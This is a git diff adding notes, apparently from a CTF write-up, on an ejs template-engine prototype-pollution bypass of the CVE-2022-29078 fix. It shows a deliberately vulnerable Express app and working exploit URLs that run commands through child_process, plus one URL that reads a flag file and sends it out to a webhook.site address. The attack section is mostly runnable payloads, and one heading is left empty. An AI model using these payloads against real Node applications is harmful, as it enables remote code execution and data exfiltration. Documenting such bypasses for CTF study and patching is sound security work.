@@ -917,12 +917,54 @@ Decoded header||payload-:```{"kid":"b854b842-0339-44da-b38f-984684b91506","alg":
 
 -------------------------
 
+### Node's ejs Prototype Pollution CVE
 
+The poc below bypasses the fix for `CVE-2022-29078` in `^3.1.7`
 
+- Example of vulnerable `index.js`, res.render in this case is controllable
 
+      const express = require('express')
+      const app = express()
+      const port = 3000
+      
+      app.set('view engine', 'ejs');
+      
+      app.get('/page', (req,res) => {
+          res.render('page', req.query);
+      })
+      
+      app.listen(port, () => {
+        console.log("Example app listening on port ${port}")
+      })
 
+- POC code: `This poc below works well with `^3.1.7`
 
+      http://127.0.0.1:3000/page?settings[view%20options][closeDelimiter]=1")%3bprocess.mainModule.require('child_process').execSync('calc')%3b//
 
+- Another POC code with [escapeFunction]
+
+      http://127.0.0.1:3000/?name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('calc');
+
+- Poc for out-of-band exfiltration
+
+      http://127.0.0.1:3000/?settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20fetch(`https://webhook.site/fb92548e-56b3-4f02-9ca7-2b702be8f227?flag=${process.mainModule.require('child_process').execSync('cat%20flag-aaee2b1430.txt').toString()}`);//
+
+### Testing on version `^3.1.9` in PatriotCtf with the above POC
+
+- Oops,we have RCE
+
+![image](https://github.com/user-attachments/assets/de683e16-2030-41b1-9e10-28bbfb267607)
+
+### Out of band exfiltration with post-bin
+
+-
+---------------------
+
+### REFERENCES:
+
+- [Github](https://gist.github.com/ky28059/d539294051afa549eb303b832c7a5826)
+- [Github](https://github.com/mde/ejs/issues/720)
+- 
 
 
 
